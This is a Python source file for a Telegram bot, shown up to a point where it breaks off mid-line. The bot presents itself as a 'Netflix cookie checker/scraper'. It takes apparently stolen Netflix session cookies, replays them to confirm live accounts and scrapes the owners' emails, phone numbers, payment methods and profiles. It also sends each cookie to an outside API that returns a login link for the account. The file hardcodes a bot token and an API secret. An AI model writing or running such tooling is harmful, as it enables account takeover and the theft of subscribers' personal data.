import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
from flask import Flask
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: GREEN = ""; RED = ""; YELLOW = ""; CYAN = ""; RESET = ""
    class Style: BRIGHT = ""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(5) 

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is Running! 24/7"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Sec-Ch-Ua": '"Chromium";v="142", "Google Chrome";v="142", "Not-A.Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Referer": "https://www.netflix.com/",
    "Origin": "https://www.netflix.com",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
}

# --- REPLACED KAMALXD WITH YOUR NEW NFTGEN API ---
API_URL = "http://nftgenapi.onrender.com/api/gen"
SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

CURRENCY_MAP = {"US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei", "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"}

def get_country_from_html(html):
    try:
        if '"currentCountry":"' in html: return html.split('"currentCountry":"')[1].split('"')[0]
    except: pass
    return "Unknown"

def get_flag(code):
    if not code or code == "Unknown" or len(code) != 2: return ""
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code): return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    if not text: return "Unknown"
    try: return codecs.decode(text, 'unicode_escape')
    except: return text

def unix_to_date(timestamp):
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except: return "N/A"

def calculate_duration(member_since_str):
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except: return ""

def extract_deep_details(html):
    details = {"plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A", "phone": "N/A", "country": "Unknown", "currency": "", "price": "N/A", "quality": "Unknown", "name": "Unknown", "extra_members": "Unknown", "member_since": "Unknown", "max_streams": "Unknown", "profiles": [], "is_dvd": False, "auto_renew": "Off ❌", "has_ads": "No", "has_pins": False, "status": "Unknown", "email_verified": "Unknown", "phone_verified": "Unknown"}
    
    if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html: details["status"] = "Active"
    elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html: details["status"] = "Expired"
    elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html: details["status"] = "Free/Never Paid"
    
    if '"isProfileLocked":true' in html: details["has_pins"] = True
    
    plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if plan_match: details["plan"] = clean_text(plan_match.group(1))
    elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
    elif re.search(r'data-uia="plan-label">([^<]+)<', html): details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
    
    if "with ads" in str(details["plan"]).lower(): details["has_ads"] = "Yes"

    qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if qual_match: details["quality"] = clean_text(qual_match.group(1))
    if details["quality"] == "Unknown":
        plan_lower = str(details["plan"]).lower()
        if "premium" in plan_lower: details["quality"] = "UHD 4K"
        elif "standard" in plan_lower: details["quality"] = "Full HD"
        elif "basic" in plan_lower: details["quality"] = "HD"
        elif "mobile" in plan_lower: details["quality"] = "SD (Mobile)"
    
    streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if streams_match: details["max_streams"] = streams_match.group(1)

    price_match = re.search(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if price_match: details["price"] = clean_text(price_match.group(1))
    else:
        loc_price = re.search(r'"localizedPrice":"([^"]+)"', html)
        if loc_price: details["price"] = clean_text(loc_price.group(1))

    pm_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if pm_match: details["payment"] = clean_text(pm_match.group(1))
    else:
        if "Visa" in html: details["payment"] = "Visa 💳"
        elif "MasterCard" in html or "Mastercard" in html: details["payment"] = "MasterCard 💳"
        elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
        elif "Amex" in html: details["payment"] = "Amex 💳"
        elif "DCB" in html: details["payment"] = "Mobile Bill (DCB) 📱"
    
    name_match = re.search(r'"userContext":\{"name":"([^"]+)"', html)
    if name_match: details["name"] = clean_text(name_match.group(1))
    elif re.search(r'"firstName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"firstName":"([^"]+)"', html).group(1))
    elif re.search(r'data-uia="account-owner-name">([^<]+)<', html): details["name"] = clean_text(re.search(r'data-uia="account-owner-name">([^<]+)<', html).group(1))
    elif re.search(r'"accountOwnerName":"([^"]+)"', html): details["name"] = clean_text(re.search(r'"accountOwnerName":"([^"]+)"', html).group(1))
    
    email_match = re.search(r'"email":"([^"]+)"', html)
    if email_match: details["email"] = clean_text(email_match.group(1))
    else:
        uc_match = re.search(r'"userContext":\{[^}]*"email":"([^"]+)"', html)
        if uc_match: details["email"] = clean_text(uc_match.group(1))
        else:
            login_id_match = re.search(r'"userLoginId":"([^"]+)"', html)
            if login_id_match: details["email"] = clean_text(login_id_match.group(1))
            elif re.search(r'data-uia="account-email">([^<]+)<', html): details["email"] = clean_text(re.search(r'data-uia="account-email">([^<]+)<', html).group(1))
            elif re.search(r'"emailAddress":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"emailAddress":"([^"]+)"', html).group(1))
            elif re.search(r'"memberEmail":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"memberEmail":"([^"]+)"', html).group(1))
            elif re.search(r'"userEmail":"([^"]+)"', html): details["email"] = clean_text(re.search(r'"userEmail":"([^"]+)"', html).group(1))

    if '"isEmailVerified":true' in html: details["email_verified"] = "Yes ✅"
    elif '"isEmailVerified":false' in html: details["email_verified"] = "No ❌"

    if details["phone"] != "N/A": details["phone_verified"] = "Yes ✅"
    
    phone_match = re.search(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"\}', html)
    if phone_match: details["phone"] = clean_text(phone_match.group(1))
    
    bill_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html)
    if bill_match:
        details["expiry"] = clean_text(bill_match.group(1))
        details["auto_renew"] = "On ✅"
    
    since_match = re.search(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
    if since_match:
        details["member_since"] = unix_to_date(since_match.group(1))
        details["member_duration"] = calculate_duration(details["member_since"])
    elif "memberSince" in html:
         ms_ui = re.search(r'data-uia="member-since">.*?Member Since ([^<]+)', html)
         if ms_ui: details["member_since"] = clean_text(ms_ui.group(1))
    
    country_match = re.search(r'"currentCountry":"([^"]+)"', html)
    if country_match: details["country"] = country_match.group(1)
    
    extra_match = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}', html)
    if extra_match and extra_match.group(1) == "true": details["extra_members"] = "Yes (Slot Available)"
    else: details["extra_members"] = "No ❌"

    details["profiles"] = []
    p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
    
    if p1:
        for name, locked, kids in p1:
            status = "🔒" if locked == "true" else "🔓"
            kid_status = "👶" if kids == "true" else ""
            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}")
    else:
        simple_names = re.findall(r'"profileName":"([^"]+)"', html)
        for name in list(set(simple_names)): details["profiles"].append(f"{clean_text(name)}")

    if not details["profiles"]:
        ui_profiles = re.findall(r'class="profile-name">([^<]+)<', html)
        if ui_profiles: details["profiles"] = [clean_text(p) for p in ui_profiles]

    if details["name"] == "Unknown" and details["profiles"]: details["name"] = details["profiles"][0].split(' ')[0]

    return details

def get_magic_link_api(netflix_id):
    try:
        if "NetflixId=" in netflix_id:
            netflix_id = netflix_id.split("NetflixId=")[1].split(";")[0].strip()
            
        payload = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        return resp.json()
    except Exception as e:
        pass 
    return None

def check_cookie(cookie_input):
    cookie_input = cookie_input.strip()
    
    if cookie_input.startswith('[') or cookie_input.startswith('{'):
        try:
            json_c = json.loads(cookie_input)
            if isinstance(json_c, list):
                for c in json_c:
                    if c.get('name') == 'NetflixId':
                        cookie_input = c.get('value')
                        break
            elif isinstance(json_c, dict):
                if 'NetflixId' in json_c: cookie_input = json_c['NetflixId']
        except: pass

    if "%" in cookie_input: cookie_input = urllib.parse.unquote(cookie_input)

    if cookie_input.lower().startswith("cookie:"): cookie_input = cookie_input.split(":", 1)[1].strip()
    
    cookie_str = cookie_input
    if "NetflixId" not in cookie_input and len(cookie_input) > 50 and "=" not in cookie_input:
        cookie_str = f"NetflixId={cookie_input}"

    netflix_id_val = None
    nid_match = re.search(r"NetflixId=([^;]+)", cookie_str)
    if nid_match: netflix_id_val = nid_match.group(1)
    elif "NetflixId" not in cookie_str and len(cookie_str) > 50: netflix_id_val = cookie_str.strip()
    
    playwright_cookies = []
    try:
        for chunk in cookie_str.split(';'):
            if '=' in chunk:
                parts = chunk.strip().split('=', 1)
                if len(parts) == 2:
                    playwright_cookies.append({'name': parts[0], 'value': parts[1], 'domain': '.netflix.com', 'path': '/'})
    except: return {"valid": False, "msg": "Cookie Parse Error"}

    api_response = None
    api_link = None
    if netflix_id_val:
        api_response = get_magic_link_api(netflix_id_val)
        if api_response and api_response.get("success"):
            api_link = api_response.get("login_url")

    try:
        session = requests.Session()
        session.headers.update(HEADERS)
        session.verify = False 
        
        for c in playwright_cookies: session.cookies.set(c['name'], c['value'], domain=c['domain'])

        resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
        
        if resp.status_code == 302 and "login" in resp.headers.get("Location", ""): return {"valid": False, "msg": "Redirected to Login (Dead)"}
        if resp.status_code == 200 and "login" in resp.url: return {"valid": False, "msg": "Redirected to Login (Dead)"}

        resp_acc = session.get("https://www.netflix.com/account", timeout=15)
        acc_html = resp_acc.text
        
        deep_data = extract_deep_details(acc_html)
        
        country = get_country_from_html(acc_html)
        if deep_data["country"] != "Unknown": country = deep_data["country"]

        if deep_data["email"] == "N/A" and api_response and api_response.get("email"):
             deep_data["email"] = api_response.get("email")

        magic_link = "Token Not Found"
        token_source = "None"
        
        if api_link:
            magic_link = api_link
            token_source = "NFTGen API"
        
        if deep_data["status"] == "Expired": return {"valid": False, "msg": "Session Valid but Account Expired (Former Member)"}
        elif deep_data["status"] == "Free/Never Paid": return {"valid": False, "msg": "Session Valid but No Subscription (Never Member)"}

        screenshot_bytes = None
        try:
            if SCREENSHOT_SEMAPHORE.acquire(timeout=20):
                try:
                    with sync_playwright() as p:
                        browser = p.chromium.launch(headless=True)
                        context = browser.new_context(user_agent=HEADERS['User-Agent'], viewport={'width': 1280, 'height': 720})
                        context.add_cookies(playwright_cookies)
                        page = context.new_page()
                        page.goto("https://www.netflix.com/browse", timeout=30000, wait_until='domcontentloaded')
                        try: page.wait_for_timeout(3000)
                        except: pass
                        screenshot_bytes = page.screenshot(type='jpeg', quality=70)
                        browser.close()
                finally:
                    SCREENSHOT_SEMAPHORE.release()
        except Exception as e: print(f"Screenshot Error: {e}")

        return {"valid": True, "country": country, "magic_link": magic_link, "data": deep_data, "token_source": token_source, "screenshot": screenshot_bytes}
        
    except Exception as e:
        if api_link:
            return {"valid": True, "country": api_response.get("country", "Unknown"), "magic_link": api_link, "data": {"email": api_response.get("email", "Unknown"), "plan": api_response.get("plan", "Premium"), "country": api_response.get("country", "Unknown"), "price": api_response.get("price", "Unknown"), "quality": "UHD", "max_streams": "4", "payment": "Unknown", "expiry": "Unknown", "status": "Active"}, "token_source": "NFTGen API (Rescue)", "screenshot": None}
        return {"valid": False, "msg": f"Error: {str(e)}"}

def main():
    print(f"{Fore.RED}========================================")
    print(f"{Fore.WHITE}   NETFLIX COOKIE CHECKER BOT (TG)      ")
    print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
    keep_alive()

    bot = telebot.TeleBot(BOT_TOKEN)
    telebot.apihelper.RETRY_ON_ERROR = True 
    print(f"\n{Fore.GREEN}[+] Bot Started! Send cookies to your bot now.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] NOTE: If you see 'Conflict' errors, STOP the bot on your PC/Laptop!{Style.RESET_ALL}")

    user_db = set()
    user_lock = threading.Lock()
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f: user_db = set(f.read().splitlines())
        except: pass

    def save_user(user_id):
        uid = str(user_id)
        if uid not in user_db:
            with user_lock:
                if uid not in user_db:
                    user_db.add(uid)
                    try:
                        with open(USERS_FILE, "a+") as f: f.write(f"{uid}\n")
                    except: pass

    def check_sub(user_id):
        if user_id == ADMIN_ID: return True
        for channel in CHANNELS:
            try:
                stat = bot.get_chat_member(channel, user_id).status
                if stat not in ['creator', 'administrator', 'member']: return False
            except: return False
        return True

    def send_force_join(chat_id):
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS: markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
        bot.send_message(chat_id, "⚠️ **You must join our channels to use this bot!**", reply_markup=markup, parse_mode='Markdown')

    @bot.message_handler(commands=['start'])
    def start(message):
        save_user(message.chat.id)
        if not check_sub(message.chat.id): return send_force_join(message.chat.id)
            
        kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.add("📩 Send Here (DM)", "📡 Send to Channel")
        kb.add("🛑 Stop System")
        
        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Here is how to use this bot:\n\n1️⃣ **Select a Mode** using the buttons below.\n2️⃣ **Send your Netflix Cookies** (Text or File).\n\n🍪 **Supported Format:**\n• `NetflixId=v2...`\n\n📝 **Example:**\n`NetflixId=v2.CT...`\n\n👇 **Select Mode to Begin:**")
        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
    def verify_join(call):
        if check_sub(call.message.chat.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("📩 Send Here (DM)", "📡 Send to Channel")
            kb.add("🛑 Stop System")
            bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
        else: bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

    @bot.message_handler(commands=['users', 'stats'])
    def user_stats(message):
        if message.chat.id != ADMIN_ID: return
        try:
            count = 0
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, "r") as f: count = len(f.read().s
